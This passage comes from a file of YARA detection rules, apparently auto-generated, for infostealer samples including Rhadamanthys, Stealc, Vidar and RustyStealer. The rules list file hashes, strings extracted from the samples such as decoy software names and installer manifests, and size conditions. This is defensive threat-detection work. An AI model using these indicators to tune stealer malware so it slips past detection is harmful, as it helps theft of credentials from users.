      $s7 = "CoCreateInstance(ShellLink)" fullword wide /* score: '9.00'*/
      $s8 = ";$;+;2;?;c;" fullword ascii /* score: '9.00'*/ /* hex encoded string ',' */
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule Rhadamanthys_signature__1deeab33a3db0d2c20caa9f7afb33436_imphash__fdfbc1ca {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_1deeab33a3db0d2c20caa9f7afb33436(imphash)_fdfbc1ca.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "fdfbc1ca939418ba3fe30ef9daca82ae843fec06997f3a21d70aeb9c18f997b6"
   strings:
      $s1 = "CryptGetHashParam" fullword wide /* score: '12.00'*/
      $s2 = "[!] %s failed: (%lu) %s" fullword wide /* score: '10.00'*/
      $s3 = "GetDIBits(color)" fullword wide /* score: '9.00'*/
      $s4 = "GetObjectW(hbmColor)" fullword wide /* score: '9.00'*/
      $s5 = "CoCreateInstance(ShellLink)" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule Rhadamanthys_signature__d7d2a39cff7498362b68f69f8e68c14e_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_d7d2a39cff7498362b68f69f8e68c14e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "18c5e368c3eaf2aeec1384a23df25b67ed99495c33567a605a7dc6905ad56c8c"
   strings:
      $s1 = "OpenProcessToken failed. Error: %lu" fullword ascii /* score: '21.00'*/
      $s2 = "GetTokenInformation failed. Error: %lu" fullword ascii /* score: '15.00'*/
      $s3 = "tMtH -G" fullword ascii /* score: '8.00'*/
      $s4 = "kfPO -:" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule RustyStealer_signature__a5dfb14ac2f6087ec6c89ffbafcba376_imphash_ {
   meta:
      description = "_subset_batch - file RustyStealer(signature)_a5dfb14ac2f6087ec6c89ffbafcba376(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "834c0a827df29f4101a2782cf1b3e380344080bb6b6f2901a6523cdaf86dfa29"
   strings:
      $s1 = "shellcode.pdb" fullword ascii /* score: '28.00'*/
      $s2 = "fatal runtime error: drop of the panic payload panicked, aborting" fullword ascii /* score: '21.00'*/
      $s3 = "fatal runtime error: I/O error: operation failed to complete synchronously, aborting" fullword ascii /* score: '18.00'*/
      $s4 = "thread panicked while processing panic. aborting." fullword ascii /* score: '15.00'*/
      $s5 = "Once instance has previously been poisoned" fullword ascii /* score: '14.00'*/
      $s6 = "library\\std\\src\\sync\\poison\\once.rs" fullword ascii /* score: '14.00'*/
      $s7 = "Local\\RustBacktraceMutex00000000" fullword ascii /* score: '11.00'*/
      $s8 = "SetThreadDescription" fullword ascii /* score: '10.00'*/
      $s9 = "library\\std\\src\\thread\\mod.rsfailed to generate unique thread ID: bitspace exhausted" fullword ascii /* score: '10.00'*/
      $s10 = "fatal runtime error: initialization or cleanup bug, aborting" fullword ascii /* score: '10.00'*/
      $s11 = "fatal runtime error: Rust panics must be rethrown, aborting" fullword ascii /* score: '10.00'*/
      $s12 = "library\\std\\src\\io\\mod.rsa formatting trait implementation returned an error when the underlying stream did not" fullword ascii /* score: '10.00'*/
      $s13 = "RUST_BACKTRACElibrary\\std\\src\\sys_common\\wtf8.rsfailed to write the buffered data" fullword ascii /* score: '10.00'*/
      $s14 = "fatal runtime error: failed to initiate panic, error , aborting" fullword ascii /* score: '10.00'*/
      $s15 = "failed to write whole buffer" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 600KB and
      8 of them
}

rule Stealc_signature__37801b95c438a73e300d9190a7cb0752_imphash__6626917d {
   meta:
      description = "_subset_batch - file Stealc(signature)_37801b95c438a73e300d9190a7cb0752(imphash)_6626917d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6626917df8fea3f9516a08e8100635b1a3b8e5bd767529ed09787a4e4f3f1444"
   strings:
      $s1 = "CDzc.TPk" fullword ascii /* score: '10.00'*/
      $s2 = ",)61=+)61" fullword ascii /* score: '9.00'*/ /* hex encoded string 'aa' */
      $s3 = "[shell32] Documents = %ls" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule Stealc_signature__37801b95c438a73e300d9190a7cb0752_imphash__8e02a14d {
   meta:
      description = "_subset_batch - file Stealc(signature)_37801b95c438a73e300d9190a7cb0752(imphash)_8e02a14d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8e02a14d123e24ae6416c999224d4065d9c54d46e76bc7d277bcca256ca4ea68"
   strings:
      $s1 = ",)61=+)61" fullword ascii /* score: '9.00'*/ /* hex encoded string 'aa' */
      $s2 = "[shell32] Documents = %ls" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule Stealc_signature__37801b95c438a73e300d9190a7cb0752_imphash__d05d6df0 {
   meta:
      description = "_subset_batch - file Stealc(signature)_37801b95c438a73e300d9190a7cb0752(imphash)_d05d6df0.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d05d6df07fb2fb70e80fb69bc8e38600b88711b2d179e024e4cb96aa43f272e5"
   strings:
      $s1 = "CDzc.TPk" fullword ascii /* score: '10.00'*/
      $s2 = ",)61=+)61" fullword ascii /* score: '9.00'*/ /* hex encoded string 'aa' */
      $s3 = "[shell32] Documents = %ls" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule Vidar_signature__37801b95c438a73e300d9190a7cb0752_imphash__5f809fd6 {
   meta:
      description = "_subset_batch - file Vidar(signature)_37801b95c438a73e300d9190a7cb0752(imphash)_5f809fd6.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5f809fd6dfd4a9835a59270b0a82fa23d4b7be207729892f58d4ed0f1cd0ea23"
   strings:
      $s1 = ",)61=+)61" fullword ascii /* score: '9.00'*/ /* hex encoded string 'aa' */
      $s2 = "[shell32] Documents = %ls" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule Rhadamanthys_signature__e19fa692f3715134ca54de4a8b165eb4_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_e19fa692f3715134ca54de4a8b165eb4(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3c2d3dd2705831ed8bd4fc730ee21877b8a28b54455c0332e3eeba157707bcb7"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "OpenProcessToken failed. Error: %lu" fullword ascii /* score: '21.00'*/
      $s3 = "GetTokenInformation failed. Error: %lu" fullword ascii /* score: '15.00'*/
      $s4 = "nstall System v3.04</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s5 = "<(=/=4=8=<=@=" fullword ascii /* score: '9.00'*/ /* hex encoded string 'H' */
      $s6 = "ubQk* 7}" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule Rhadamanthys_signature__2195c631 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_2195c631.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2195c63144dcb0f94a6bea184c1811b3eceec353e59d442fe007addd78bc696c"
   strings:
      $s1 = "microserciasmb32rv1.exe" fullword ascii /* score: '22.00'*/
      $s2 = "libunistring-5.dll" fullword ascii /* score: '20.00'*/
      $s3 = "libpsl-5.dll" fullword ascii /* score: '20.00'*/
      $s4 = "libidn2-0.dll" fullword ascii /* score: '20.00'*/
      $s5 = "libintl-8.dllPK" fullword ascii /* score: '16.00'*/
      $s6 = "UFRFJFZFz" fullword ascii /* base64 encoded string */ /* score: '14.00'*/
      $s7 = "libidn2-0.dllPK" fullword ascii /* score: '13.00'*/
      $s8 = "libunistring-5.dllPK" fullword ascii /* score: '13.00'*/
      $s9 = "libpsl-5.dllPK" fullword ascii /* score: '13.00'*/
      $s10 = "libiconv-2.dllPK" fullword ascii /* score: '13.00'*/
      $s11 = "microserciasmb32rv1.exePK" fullword ascii /* score: '11.00'*/
      $s12 = "8Q0I0Y0M0" fullword ascii /* base64 encoded string */ /* score: '11.00'*/
      $s13 = "vpQpIpipepKp{pGpOpop_" fullword ascii /* score: '10.00'*/
      $s14 = "?6<6>6=6?" fullword ascii /* score: '9.00'*/ /* hex encoded string 'ff' */
      $s15 = "* bE!v" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 10000KB and
      8 of them
}

rule Rhadamanthys_signature__b729b61eb1515fcf7b3e511e4e66258b_imphash__bcb4df3b {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_b729b61eb1515fcf7b3e511e4e66258b(imphash)_bcb4df3b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bcb4df3b203c95703ac165e532f45232b0663c4dd7e8f212b6f88982d84cef4e"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v4.67.4-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = ":- -CW" fullword ascii /* score: '9.00'*/
      $s6 = "jsnhjba" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and all of them
}

rule Rhadamanthys_signature__c32ba42c73a2bc24d2788f7750d87edb_imphash__047fec4c {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_c32ba42c73a2bc24d2788f7750d87edb(imphash)_047fec4c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "047fec4c79e5514024812bdd96f293ae46073f824feed92abdc29cf5279c79cf"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v7.26.1-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = "3<'-7@^[/" fullword ascii /* score: '9.00'*/ /* hex encoded string '7' */
      $s6 = "* g\\?~" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 9000KB and
      1 of ($x*) and all of them
}

rule Rhadamanthys_signature__c32ba42c73a2bc24d2788f7750d87edb_imphash__ff1363c1 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_c32ba42c73a2bc24d2788f7750d87edb(imphash)_ff1363c1.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ff1363c1e97e63037491520fd0f4b1b1f72a43c97adfc68c870505f9066cd950"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v2.46.2-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = "IcDLlqp4b" fullword ascii /* score: '9.00'*/
      $s6 = "S<7 - '" fullword ascii /* score: '9.00'*/
      $s7 = "High-performance document scanning and organization software." fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and all of them
}

rule SalatStealer_signature__53ff33fd5198e78ab468db682bbdf2b7_imphash_ {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_53ff33fd5198e78ab468db682bbdf2b7(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ddcbd13f0eb96022683d931bfee814a55413f5936bcb2cc3c829ee1ec8689f4b"
   strings:
      $s1 = "464;4@4^4" fullword ascii /* score: '9.00'*/ /* hex encoded string 'FDD' */
      $s2 = "* :'}B" fullword ascii /* score: '9.00'*/
      $s3 = "ghbtfdg" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule Rhadamanthys_signature__d1d592e5 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_d1d592e5.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d1d592e561e4d12e4e7f4a12c6c9e379eedb8f6633f0f3ab0ba811166d8ab7bc"
   strings:
      $s1 = "COMSupport.dll" fullword ascii /* score: '29.00'*/
      $s2 = "NLEService.dll" fullword ascii /* score: '26.00'*/
      $s3 = "DVDSetting.dll" fullword ascii /* score: '23.00'*/
      $s4 = "NLEResource.dll" fullword ascii /* score: '23.00'*/
      $s5 = "NLETransitionMgr.dll" fullword ascii /* score: '23.00'*/
      $s6 = "ExceptionHandler.dll" fullword ascii /* score: '23.00'*/
      $s7 = "BugSplat.dll" fullword ascii /* score: '23.00'*/
      $s8 = "WsBurn.dll" fullword ascii /* score: '23.00'*/
      $s9 = "WSUtilities.dll" fullword ascii /* score: '23.00'*/
      $s10 = "DBGHelp.dll" fullword ascii /* score: '23.00'*/
      $s11 = "WS_Log.dll" fullword ascii /* score: '22.00'*/
      $s12 = "WS_ImageProc.dll" fullword ascii /* score: '20.00'*/
      $s13 = "Set-up.exe" fullword ascii /* score: '16.00'*/
      $s14 = "dCdQRjtRv" fullword ascii /* base64 encoded string */ /* score: '14.00'*/
      $s15 = "999yyy" fullword ascii /* reversed goodware string  */ /* score: '11.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 16000KB and
      8 of them
}

rule Rhadamanthys_signature__5ae8da8d195503ea36a6c31c6043ecb8_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_5ae8da8d195503ea36a6c31c6043ecb8(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "dc607269ab0a43e6a67f5d4092be0924a1be0e7f11efff698bb4cb94b1b319f8"
   strings:
      $s1 = "CryEngineLauncher.exe" fullword wide /* score: '22.00'*/
      $s2 = "YYYYYZ" fullword ascii /* reversed goodware string 'ZYYYYY' */ /* score: '16.50'*/
      $s3 = "KYYYYY" fullword ascii /* reversed goodware string 'YYYYYK' */ /* score: '16.50'*/
      $s4 = "ZYYYXX" fullword ascii /* reversed goodware string 'XXYYYZ' */ /* score: '13.50'*/
      $s5 = "CryEngine Launcher - Game Development Environment" fullword wide /* score: '12.00'*/
      $s6 = "ZXXZYYYYZX" fullword ascii /* score: '9.50'*/
      $s7 = "YYXXYZXXYYYYXX" fullword ascii /* score: '9.50'*/
      $s8 = "RYYYYZZXZ" fullword ascii /* score: '9.50'*/
      $s9 = "YXXXYZXYYYYZ" fullword ascii /* score: '9.50'*/
      $s10 = "YYYYZZXXY" fullword ascii /* score: '9.50'*/
      $s11 = "+ /c!Z" fullword ascii /* score: '9.00'*/
      $s12 = "erOA /x" fullword ascii /* score: '8.00'*/
      $s13 = "+ GbmPAR]" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 20000KB and
      8 of them
}

rule Rhadamanthys_signature__5ae8da8d195503ea36a6c31c6043ecb8_imphash__81188a06 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_5ae8da8d195503ea36a6c31c6043ecb8(imphash)_81188a06.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "81188a06498761380c1c242428199663551fef950efdd364d7a73e0c024a0156"
   strings:
      $s1 = "CryEngineLauncher.exe" fullword wide /* score: '22.00'*/
      $s2 = "LRXZZZXZZ" fullword ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s3 = "YXZXXXZZX" fullword ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s4 = "FXXXXXX" fullword ascii /* reversed goodware string */ /* score: '16.50'*/
      $s5 = "ZYYYXX" fullword ascii /* reversed goodware string  */ /* score: '13.50'*/
      $s6 = "XZYXXX" fullword ascii /* reversed goodware string  */ /* score: '13.50'*/
      $s7 = "CryEngine Launcher - Game Development Environment" fullword wide /* score: '12.00'*/
      $s8 = "kircbt" fullword ascii /* score: '10.00'*/
      $s9 = "YXYYYYX" fullword ascii /* score: '9.50'*/
      $s10 = "YYZYYYYZ" fullword ascii /* score: '9.50'*/
      $s11 = "YYYYZZX" fullword ascii /* score: '9.50'*/
      $s12 = "YZXZXZYYYYXY" fullword ascii /* score: '9.50'*/
      $s13 = "YZZYYYY" fullword ascii /* score: '9.50'*/
      $s14 = "YXZXYYYY" fullword ascii /* score: '9.50'*/
      $s15 = "* 7p<N" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 20000KB and
      8 of them
}

rule Rhadamanthys_signature__979d4d3c19bd1d7e944b1ba868d6cce7_imphash__ad568e19 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_979d4d3c19bd1d7e944b1ba868d6cce7(imphash)_ad568e19.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ad568e191fafcd83b9215ed30be548580f1e4f0e9cef7a453765a84afe82b38e"
   strings:
      $s1 = "VLC media player - Free and Open Source Media Player" fullword wide /* score: '12.00'*/
      $s2 = "getwls" fullword ascii /* score: '10.00'*/
      $s3 = "* *\\|o&" fullword ascii /* score: '9.00'*/
      $s4 = "T+ dmts?&" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      all of them
}

rule Rhadamanthys_signature__979d4d3c19bd1d7e944b1ba868d6cce7_imphash__ff39b785 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_979d4d3c19bd1d7e944b1ba868d6cce7(imphash)_ff39b785.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ff39b785672ec33edd2c0a7e4a69ab9f87a2e6c8d96b9f0e941f35fa33f13c77"
   strings:
      $s1 = "CryEngineLauncher.exe" fullword wide /* score: '22.00'*/
      $s2 = "CryEngine Launcher - Game Development Environment" fullword wide /* score: '12.00'*/
      $s3 = "* !34r" fullword ascii /* score: '9.00'*/
      $s4 = "* R(0l$" fullword ascii /* score: '9.00'*/
      $s5 = "5c:%S%3" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 9000KB and
      all of them
}

rule Rhadamanthys_signature__68c812220ef41a1bea0980e196c18e31_imphash__5704fabd {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_68c812220ef41a1bea0980e196c18e31(imphash)_5704fabd.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5704fabda6a0851ea156d1731b4ed4383ce102ec3a93f5d7109cc2f47f8196d0"
   strings:
      $s1 = "aurorarender.exe" fullword wide /* score: '22.00'*/
      $s2 = "YXXYXX" fullword ascii /* reversed goodware string 'XXYXXY' */ /* score: '13.50'*/
      $s3 = "XXYXYZ" fullword ascii /* reversed goodware string 'ZYXYXX' */ /* score: '13.50'*/
      $s4 = "XXXXYX" fullword ascii /* reversed goodware string 'XYXXXX' */ /* score: '13.50'*/
      $s5 = "XXYXYY" fullword ascii /* reversed goodware string 'YYXYXX' */ /* score: '13.50'*/
      $s6 = "YXYXYX" fullword ascii /* reversed goodware string 'XYXYXY' */ /* score: '13.50'*/
      $s7 = "Aurora Render - Real-time Rendering Engine" fullword wide /* score: '12.00'*/
      $s8 = "eyexy94" fullword ascii /* score: '10.00'*/
      $s9 = "eyxj9.FmH" fullword ascii /* score: '10.00'*/
      $s10 = "YYYYZZXZ" fullword ascii /* score: '9.50'*/
      $s11 = "YXXXYZYYYY" fullword ascii /* score: '9.50'*/
      $s12 = "62?['|62?" fullword ascii /* score: '9.00'*/ /* hex encoded string 'bb' */
      $s13 = "*  &1&&" fullword ascii /* score: '9.00'*/
      $s14 = "FoVp0cD" fullword ascii /* score: '9.00'*/
      $s15 = "R? /u " fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 27000KB and
      8 of them
}

rule Rhadamanthys_signature__68c812220ef41a1bea0980e196c18e31_imphash__a269d4bc {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_68c812220ef41a1bea0980e196c18e31(imphash)_a269d4bc.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a269d4bc0082e1bc72943667466d193fe667040aa0c5b36b953a6ee6766b7cc1"
   strings:
      $s1 = "rendercore.exe" fullword wide /* score: '22.00'*/
      $s2 = "RenderCore Engine - High-performance 3D rendering engine" fullword wide /* score: '12.00'*/
      $s3 = "dYXtL!hZ+ " fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 15000KB and
      all of them
}

rule Rhadamanthys_signature__68c812220ef41a1bea0980e196c18e31_imphash__a9ca272e {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_68c812220ef41a1bea0980e196c18e31(imphash)_a9ca272e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a9ca272e70f4463ae8a76c68746c52dadd8e2106e4c31a790cddf2cad22f0b97"
   strings:
      $s1 = "BCOMDLG32.dll" fullword ascii /* score: '26.00'*/
      $s2 = "rendercore.exe" fullword wide /* score: '22.00'*/
      $s3 = "RenderCore Engine - High-performance 3D rendering engine" fullword wide /* score: '12.00'*/
      $s4 = "iddFiZ.ljU" fullword ascii /* score: '10.00'*/
      $s5 = ";}\"5}5-<" fullword ascii /* score: '9.00'*/ /* hex encoded string 'U' */
   condition:
      uint16(0) == 0x5a4d and filesize < 16000KB and
      all of them
}

rule Stealc_signature__dc4152fd8ffd9d76d82af552da62e323_imphash_ {
   meta:
      description = "_subset_batch - file Stealc(signature)_dc4152fd8ffd9d76d82af552da62e323(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b6f6d70fc40e79f213119441e6cc05acbb222a3ece6cfb1d4295c922dbc1e00f"
   strings:
      $s1 = "Panda3D.exe" fullword wide /* score: '22.00'*/
      $s2 = "YYYYYZ" fullword ascii /* reversed goodware string */ /* score: '16.50'*/
      $s3 = "XXZZYXZXZ" fullword ascii /* base64 encoded string */ /* score: '16.50'*/
      $s4 = "XXZYZXZXXY" fullword ascii /* base64 encoded string */ /* score: '16.50'*/
      $s5 = "XYYYYY" fullword ascii /* reversed goodware string */ /* score: '16.50'*/
      $s6 = "XXXXYX" fullword ascii /* reversed goodware string */ /* score: '13.50'*/
      $s7 = "ZZZXXX" fullword ascii /* reversed goodware string */ /* score: '13.50'*/
      $s8 = "ZYYXXX" fullword ascii /* reversed goodware string  */ /* score: '13.50'*/
      $s9 = "XXXXZZ" fullword ascii /* reversed goodware string */ /* score: '13.50'*/
      $s10 = "Panda3D - Open Source Game Engine" fullword wide /* score: '12.00'*/
      $s11 = "PYYYYXXXYXZ" fullword ascii /* score: '9.50'*/
      $s12 = "YXYYYYZ" fullword ascii /* score: '9.50'*/
      $s13 = "YYYYXZYY" fullword ascii /* score: '9.50'*/
      $s14 = "QYYYYZZ" fullword ascii /* score: '9.50'*/
      $s15 = "XYZYZYYYYY" fullword ascii /* score: '9.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 20000KB and
      8 of them
}

rule Rhadamanthys_signature__979d4d3c19bd1d7e944b1ba868d6cce7_imphash__4048a41b {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_979d4d3c19bd1d7e944b1ba868d6cce7(imphash)_4048a41b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4048a41b0e3918c70f9ba056a4e646be76ae51293aad877fd3cdade57893a4f0"
   strings:
      $s1 = "CryEngine.exe" fullword wide /* score: '22.00'*/
      $s2 = "PROC_OUT = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s3 = "8PROC_IN = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s4 = "/dumpstatus" fullword ascii /* score: '14.00'*/
      $s5 = "Developed by Crytek. Visit www.crytek.com for more information." fullword wide /* score: '14.00'*/
      $s6 = "CryEngine - A high-performance game development engine" fullword wide /* score: '12.00'*/
      $s7 = "|WinLicenseDriverVersion" fullword ascii /* score: '10.00'*/
      $s8 = "Please, contact the software developers with the following codes. Thank you. (version %d.%d.%d)" fullword ascii /* score: '10.00'*/
      $s9 = "/logstatus" fullword ascii /* score: '9.00'*/
      $s10 = "* Ynsx" fullword ascii /* score: '9.00'*/
      $s11 = "/getwlstatus" fullword ascii /* score: '9.00'*/
      $s12 = "* H.[K" fullword ascii /* score: '9.00'*/
      $s13 = "3<$1<$3<$\\9" fullword ascii /* score: '9.00'*/ /* hex encoded string '19' */
   condition:
      uint16(0) == 0x5a4d and filesize < 13000KB and
      8 of them
}

rule Stealc_signature__a56f115ee5ef2625bd949acaeec66b76_imphash__c4fa1832 {
   meta:
      description = "_subset_batch - file Stealc(signature)_a56f115ee5ef2625bd949acaeec66b76(imphash)_c4fa1832.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c4fa1832211538463badc229f03d51ba8fa1e20024a1278897232393d1171644"
   strings:
      $s1 = "CryEngine.exe" fullword wide /* score: '22.00'*/
      $s2 = "PROC_IN = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s3 = "PROC_OUT = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s4 = "/dumpstatus" fullword ascii /* score: '14.00'*/
      $s5 = "Developed by Crytek. Visit www.crytek.com for more information." fullword wide /* score: '14.00'*/
      $s6 = "CryEngine - A high-performance game development engine" fullword wide /* score: '12.00'*/
      $s7 = " WinLicenseDriverVersion" fullword ascii /* score: '10.00'*/
      $s8 = "WPlease, contact the software developers with the following codes. Thank you. (version %d.%d.%d)" fullword ascii /* score: '10.00'*/
      $s9 = "/logstatus" fullword ascii /* score: '9.00'*/
      $s10 = "/getwlstatus" fullword ascii /* score: '9.00'*/
      $s11 = "3,$1,$3,$\\9" fullword ascii /* score: '9.00'*/ /* hex encoded string '19' */
   condition:
      uint16(0) == 0x5a4d and filesize < 12000KB and
      8 of them
}

rule Stealc_signature__a56f115ee5ef2625bd949acaeec66b76_imphash_ {
   meta:
      description = "_subset_batch - file Stealc(signature)_a56f115ee5ef2625bd949acaeec66b76(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a2a672bc9c70b9ee9f48e196ae71003a69ea577efef03fc263bde3834012e096"
   strings:
      $s1 = "DataSync.exe" fullword wide /* score: '22.00'*/
      $s2 = "PROC_IN = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s3 = "PROC_OUT = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s4 = "Developed by SyncSolutions Inc. Visit www.syncsolutions.com for more information." fullword wide /* score: '14.00'*/
      $s5 = "/dumpstatus" fullword ascii /* score: '14.00'*/
      $s6 = "DataSync - Enterprise data synchronization tool" fullword wide /* score: '12.00'*/
      $s7 = "Please, contact the software developers with the following codes. Thank you. (version %d.%d.%d)" fullword ascii /* score: '10.00'*/
      $s8 = "4pWinLicenseDriverVersion" fullword ascii /* score: '10.00'*/
      $s9 = "/logstatus" fullword ascii /* score: '9.00'*/
      $s10 = "/getwlstatus" fullword ascii /* score: '9.00'*/
      $s11 = "* mS22" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 11000KB and
      8 of them
}

rule Rhadamanthys_signature__979d4d3c19bd1d7e944b1ba868d6cce7_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_979d4d3c19bd1d7e944b1ba868d6cce7(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9fdac7bc255ce2b331aa779f1871b491609d57452cc0ed6f85dd7e9a2a0f84d7"
   strings:
